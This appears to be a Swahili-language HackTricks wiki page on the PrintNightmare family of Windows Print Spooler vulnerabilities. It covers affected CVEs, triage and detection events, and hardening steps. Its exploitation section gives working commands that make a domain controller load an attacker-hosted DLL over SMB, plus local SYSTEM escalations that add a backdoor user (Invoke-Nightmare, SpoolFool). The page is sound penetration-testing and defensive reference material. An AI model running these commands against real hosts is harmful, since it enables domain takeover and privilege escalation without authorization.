# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ni jina la pamoja linalopewa familia ya vulnerabilities katika huduma ya Windows **Print Spooler**, zinazoruhusu **arbitrary code execution kama SYSTEM** na, wakati spooler inapatikana kupitia RPC, **remote code execution (RCE) kwenye domain controllers na file servers**. CVE zilizotumiwa zaidi ni **CVE-2021-1675** (hapo awali iliainishwa kama LPE) na **CVE-2021-34527** (RCE kamili). Masuala yaliyofuata kama **CVE-2021-34481 (“Point & Print”)** na **CVE-2022-21999 (“SpoolFool”)** yanathibitisha kuwa attack surface bado haijafungwa kikamilifu.

Ikiwa unatafuta **authentication coercion / relay** kupitia spooler badala ya **driver-based RCE/LPE**, angalia [ukurasa huu mwingine kuhusu printer coercion abuse](printers-spooler-service-abuse.md). Ukurasa huu unaangazia **kupakia drivers / DLLs kama SYSTEM**.

---

## 1. Vipengele vilivyo hatarini & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Iliwekwa patch katika June 2021 CU lakini ikakwepwa na CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` inaruhusu authenticated users kupakia driver DLL kutoka remote share; baada ya August 2021 hii kwa kawaida huhitaji Point & Print policies zilizodhoofishwa|
|2021|CVE-2021-34481|“Point & Print”|LPE|Usakinishaji wa unsigned driver na non-admin users|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Uundaji wa arbitrary directory → DLL planting – hufanya kazi baada ya patches za 2021|

Zote zinatumia vibaya mojawapo ya **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) au trust relationships ndani ya **Point & Print**.

## 2. Mbinu za Exploitation

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

Domain user aliye-authenticated lakini **asiye na privileges** anaweza kuendesha arbitrary DLLs kama **NT AUTHORITY\SYSTEM** kwenye remote spooler (mara nyingi DC) kwa:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
PoCs maarufu zinajumuisha **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) na modules za `misc::printnightmare / lsa::addsid` za Benjamin Delpy katika **mimikatz**.

### 2.2 Local privilege escalation (Windows yoyote inayotumika, 2021-2024)

API hiyo hiyo inaweza kuitwa **locally** ili kupakia driver kutoka `C:\Windows\System32\spool\drivers\x64\3\` na kupata SYSTEM privileges:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Triage ya kisasa kwenye hosts zilizofanyiwa patch

Kwenye host iliyosasishwa kikamilifu, PrintNightmare PoCs za umma mara nyingi hushindwa kwa sababu Windows sasa kwa chaguo-msingi inahitaji **administrator pekee** kusakinisha printer driver (`RestrictDriverInstallationToAdministrators=1` tangu Agosti 10, 2021). Kabla ya kujaribu exploit dhidi ya target, kwanza angalia ikiwa mazingira yamerudisha nyuma mabadiliko hayo ya usalama kwa ajili ya printer deployments za zamani:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Thamani mbili dhaifu zinazovutia zaidi kwa kawaida ni:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Kutoka Linux, thibitisha haraka kwamba target inafichua print RPC interfaces husika kabla ya kuendesha PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Baadhi ya **tooling** mpya ya umma pia hukupa **workflow ya check/list** iliyo salama zaidi kabla ya kutuma DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Ukipata `RPC_E_ACCESS_DENIED` (`0x8001011b`) ukiwa mtumiaji mwenye privileges ndogo, kwa kawaida unaona default ya baada ya 2021 badala ya transport failure.

> Kwenye Windows 11 22H2+ na client builds mpya zaidi, remote printing kwa default hutumia **RPC over TCP**, na **RPC over named pipes** (`\PIPE\spoolss`) imezimwa isipokuwa iwashwe tena waziwazi. Baadhi ya PoCs na maelezo ya maabara ya zamani bado hudhani kuwa named pipe inaweza kufikiwa.

### 2.4 Package Point & Print abuse kwenye mitandao “patched”

Mazingira mengi ya enterprise yaliendelea kuwa **vulnerable by policy** baada ya patches za awali za 2021 kwa sababu workflows za helpdesk au print-server bado zilihitaji watumiaji wasio admins kusakinisha/kusasisha drivers. Kwa vitendo, offensive playbook huwa:

- Ikiwa security prompts zimezimwa kabisa, **classic arbitrary-DLL PrintNightmare** bado ndiyo njia fupi zaidi.
- Ikiwa `Only use Package Point and Print` imewashwa, kwa kawaida unahitaji kugeukia njia ya **signed package-aware driver** badala ya raw DLL drop.
- Utafiti wa 2024 ulionyesha kuwa **`Package Point and Print - Approved servers` si trust boundary thabiti yenyewe**: ikiwa attacker anaweza ku-spoof au ku-hijack name resolution kwa print server moja iliyoidhinishwa, victims bado wanaweza kuelekezwa kwenye malicious server inayotimiza policy checks.
- Hata kuchanganya UNC hardening na forced RPC-over-SMB kunaweza kuwa brittle kwa sababu clients za kisasa zinaweza **kufanya fallback kwenda RPC over TCP**.

Hii ndiyo sababu exploitation ya kisasa ya aina ya PrintNightmare mara nyingi inahusu zaidi **abusing enterprise printer deployment policy** kuliko kurudia PoC ya awali ya 2021 bila mabadiliko.

### 2.5 SpoolFool (CVE-2022-21999) – kupita fixes za 2021

Patches za Microsoft za 2021 zilizuia remote driver loading lakini **hazikuimarisha directory permissions**. SpoolFool hutumia vibaya parameter ya `SpoolDirectory` kuunda directory yoyote chini ya `C:\Windows\System32\spool\drivers\`, huweka payload DLL, na kulazimisha spooler kuipakia:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit hii hufanya kazi kwenye Windows 7 → Windows 11 na Server 2012R2 → 2022 zilizo na patches zote kabla ya updates za Februari 2022

---

## 3. Ugunduzi na hunting

* **PrintService logs** – washa channel ya *Microsoft-Windows-PrintService/Operational* na fuatilia **Event ID 316** (driver imeongezwa/imesasishwa, kwa kawaida hujumuisha majina ya DLL) kwenye majaribio yaliyofaulu na yaliyoshindikana. Iunganishe na **Event ID 808/811** ili kugundua kushindwa kwa upakiaji wa module/driver za spooler kwa njia ya kutia shaka.
* **Sysmon** – `Event ID 7` (Image loaded) au `11/23` (File write/delete) ndani ya `C:\Windows\System32\spool\drivers\*` wakati mchakato mzazi ni **spoolsv.exe**.
* **Process lineage** – toa alert kila **spoolsv.exe** inapozalisha `cmd.exe`, `rundll32.exe`, PowerShell, au child process nyingine yoyote isiyotarajiwa na isiyosainiwa.
* **Network telemetry** – SMB fetches zisizotarajiwa kutoka **spoolsv.exe** kwenda kwenye shares zinazodhibitiwa na attacker, au printer RPC traffic isiyo ya kawaida kutoka kwenye servers ambazo hazipaswi kufanya kazi kama print servers, zote ni leads zenye signal kubwa.

## 4. Mitigation na hardening

1. **Fanya patch!** – Tumia cumulative update ya hivi karibuni kwenye kila Windows host iliyo na Print Spooler service iliyosakinishwa.
2. **Disable spooler pale ambapo haihitajiki**, hasa kwenye Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Zuia remote connections** huku ukiruhusu local printing – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Weka Point & Print kwa admins pekee** kwa kuweka:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Mwongozo wa kina unapatikana kwenye Microsoft KB5005652
5. Ikiwa mahitaji ya biashara yanalazimisha `RestrictDriverInstallationToAdministrators=0`, chukulia kila printer policy nyingine kuwa **partial mitigation pekee**. Kwa kiwango cha chini, pendelea **package-aware drivers**, washa **Only use Package Point and Print**, na zuia **Package Point and Print - Approved servers** kwa print servers zilizo wazi ndani ya forest.
6. **Usirudishe nyuma printer RPC privacy** ili tu kurekebisha printer mappings zilizoharibika. Environments zinazoweka `RpcAuthnLevelPrivacyEnabled=0` zinaondoa hardening iliyoongezwa kwa ajili ya **CVE-2021-1678** na kwa kawaida zinahitaji scrutiny ya ziada wakati wa engagement.

---

## 5. Utafiti / tools zinazohusiana

* modules za [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implementation ya kawaida ya Impacket yenye modes za `-check`, `-list`, na `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper yenye SMB delivery iliyojengwa ndani, support ya targets nyingi, na modes za `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuse ya vulnerable printer driver yako mwenyewe kupitia package Point & Print
* SpoolFool exploit na write-up
* 0patch micropatches za SpoolFool na bugs nyingine za spooler

Ikiwa unataka **coerce authentication** kupitia spooler badala ya kupakia driver, nenda kwenye [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Marejeleo

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
